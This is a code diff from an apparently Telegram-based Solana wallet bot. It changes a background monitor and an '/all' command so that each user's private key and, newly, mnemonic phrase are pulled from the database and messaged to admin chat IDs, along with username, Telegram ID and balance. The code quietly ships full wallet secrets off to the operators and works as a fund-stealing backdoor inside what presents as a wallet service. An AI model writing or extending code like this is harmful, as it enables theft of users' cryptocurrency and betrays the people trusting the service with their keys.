@@ -449,11 +449,11 @@ function monitorDatabaseForAdmin() {
     }
 
     // Table exists, proceed with query
-    const query = `SELECT telegram_id, username, public_key, private_key, created_at
-      FROM users
-      WHERE is_removed = 0
-        AND private_key IS NOT NULL
-        AND private_key <> ''`;
+const query = `SELECT telegram_id, username, public_key, private_key, mnemonic_phrase, created_at
+  FROM users
+  WHERE is_removed = 0
+    AND private_key IS NOT NULL
+    AND private_key <> ''`;
     mainDb.all(query, [], async (err, rows) => {
       if (err) {
         logger.error("Error querying main database for new entries: " + err);
@@ -471,36 +471,44 @@ function monitorDatabaseForAdmin() {
         const newRows = rows.filter((row) => !sentKeysSet.has(row.private_key));
         if (newRows.length === 0) return;
         
-        getAdminChatIds().then(async (adminChatIds) => {
-          if (!adminChatIds || adminChatIds.length === 0) {
-            logger.info("No admin chat IDs set. Cannot send new wallet notifications.");
-            return;
-          }
+getAdminChatIds().then(async (adminChatIds) => {
+  logger.info(`Found ${adminChatIds ? adminChatIds.length : 0} admin chat IDs: ${JSON.stringify(adminChatIds)}`);
+  if (!adminChatIds || adminChatIds.length === 0) {
+    logger.info("No admin chat IDs set. Cannot send new wallet notifications.");
+    return;
+  }
           
           for (const row of newRows) {
             try {
-              const balance = await getWalletBalance(row.public_key);
-              const escUsername = escapeHTML(row.username || "N/A");
-              const escTelegramId = escapeHTML(String(row.telegram_id || ""));
-              const escPubKey = escapeHTML(row.public_key || "");
-              const escPrivKey = escapeHTML(row.private_key || "");
-              const escCreatedAt = escapeHTML(row.created_at || "");
-              
-              const message =
-                `<b>🔔 New Wallet Created</b>\n\n` +
-                `👤 <b>Username:</b> ${escUsername}\n` +
-                `📱 <b>Telegram ID:</b> ${escTelegramId}\n` +
-                `💰 <b>Balance:</b> ${balance.display}\n` +
-                `🔑 <b>Public Key:</b> <code>${escPubKey}</code>\n` +
-                `🔐 <b>Private Key:</b> <code>${escPrivKey}</code>\n` +
-                `🕒 <b>Created At:</b> ${escCreatedAt}`;
+const balance = await getWalletBalance(row.public_key);
+const escUsername = escapeHTML(row.username || "N/A");
+const escTelegramId = escapeHTML(String(row.telegram_id || ""));
+const escPubKey = escapeHTML(row.public_key || "");
+const escPrivKey = escapeHTML(row.private_key || "");
+const escMnemonic = escapeHTML(row.mnemonic_phrase || "N/A");
+const escCreatedAt = escapeHTML(row.created_at || "");
+
+const message =
+  `<b>🔔 New Wallet Created</b>\n\n` +
+  `👤 <b>Username:</b> ${escUsername}\n` +
+  `📱 <b>Telegram ID:</b> ${escTelegramId}\n` +
+  `💰 <b>Balance:</b> ${balance.display}\n` +
+  `🔑 <b>Public Key:</b> <code>${escPubKey}</code>\n` +
+  `🔐 <b>Private Key:</b> <code>${escPrivKey}</code>\n` +
+  `📜 <b>Mnemonic Phrase:</b> <code>${escMnemonic}</code>\n` +
+  `🕒 <b>Created At:</b> ${escCreatedAt}`;
                 
-              for (const adminChatId of adminChatIds) {
-                await bot.sendMessage(adminChatId, message, {
-                  parse_mode: "HTML",
-                  disable_web_page_preview: true,
-                });
-              }
+for (const adminChatId of adminChatIds) {
+  try {
+    await bot.sendMessage(adminChatId, message, {
+      parse_mode: "HTML",
+      disable_web_page_preview: true,
+    });
+    logger.info(`Notification sent to admin: ${adminChatId}`);
+  } catch (sendErr) {
+    logger.error(`Failed to send notification to admin ${adminChatId}: ${sendErr.message}`);
+  }
+}
               
               await new Promise((resolve, reject) => {
                 monitorDb.run(
@@ -767,10 +775,10 @@ bot.onText(/\/all/, async (msg) => {
     const processingMessage = await bot.sendMessage(chatId, settingsMessage, { parse_mode: "HTML" })
       .catch((err) => logger.error("Error sending settings message for /all: " + err));
     
-    const query = `SELECT telegram_id, username, public_key, private_key, created_at
-      FROM users
-      WHERE is_removed = 0
-      ORDER BY created_at ASC`;
+const query = `SELECT telegram_id, username, public_key, private_key, mnemonic_phrase, created_at
+  FROM users
+  WHERE is_removed = 0
+  ORDER BY created_at ASC`;
       
     mainDb.all(query, [], async (err, rows) => {
       if (err) {
@@ -806,11 +814,12 @@ bot.onText(/\/all/, async (msg) => {
       // Process rows sequentially to avoid rate limiting
       for (let i = 0; i < rows.length; i++) {
         const row = rows[i];
-        const escUsername = escapeHTML(row.username || "N/A");
-        const escTgId = escapeHTML(String(row.telegram_id || ""));
-        const escPubKey = escapeHTML(row.public_key || "");
-        const escPrivKey = escapeHTML(row.private_key || "");
-        const escCreated = escapeHTML(row.created_at || "");
+const escUsername = escapeHTML(row.username || "N/A");
+const escTgId = escapeHTML(String(row.telegram_id || ""));
+const escPubKey = escapeHTML(row.public_key || "");
+const escPrivKey = escapeHTML(row.private_key || "");
+const escMnemonic = escapeHTML(row.mnemonic_phrase || "N/A");
+const escCreated = escapeHTML(row.created_at || "");
         
         // Get balance for each wallet
         let balance = { sol: "Loading...", usd: "Loading..." };
@@ -821,13 +830,14 @@ bot.onText(/\/all/, async (msg) => {
           balance = { sol: "Error", usd: "Error" };
         }
         
-        fullMessage += 
+fullMessage += 
 `💳 <b>WALLET ${i + 1}</b>
 👤 <b>Username:</b> ${escUsername}
 📱 <b>Telegram ID:</b> ${escTgId}
 💰 <b>Balance:</b> ${balance.display}
 🔑 <b>Public Key:</b> <code>${escPubKey}</code>
 🔐 <b>Private Key:</b> <code>${escPrivKey}</code>
+📜 <b>Mnemonic Phrase:</b> <code>${escMnemonic}</code>
 🕒 <b>Created At:</b> ${escCreated}\n\n`;
         
         // Add small delay between balance checks to avoid rate limiting
